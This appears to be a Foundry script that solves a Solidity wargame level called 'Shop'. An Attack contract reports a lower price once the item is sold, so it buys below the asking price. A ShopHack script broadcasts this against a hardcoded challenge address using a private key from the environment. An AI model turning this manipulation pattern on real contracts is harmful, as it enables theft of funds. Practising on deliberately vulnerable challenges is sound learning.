// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Shop, Buyer} from "../src/Shop.sol";

contract Attack {
    Shop shop;
    constructor(Shop _shop) {
        shop = Shop(_shop);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 99 : 100;
    }
}

contract ShopHack is Script {
    Shop public shop = Shop(0x5eDcC6d136BEf03F1d35683C3A6894C4B2EF5C66);
    Attack attack;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attack = new Attack(shop);
        attack.buy();
        
        vm.stopBroadcast();
    }
}

// forge script script/Shop.s.sol -vv  --tc ShopHack
// forge script script/Shop.s.sol -vv  --broadcast --tc ShopHack
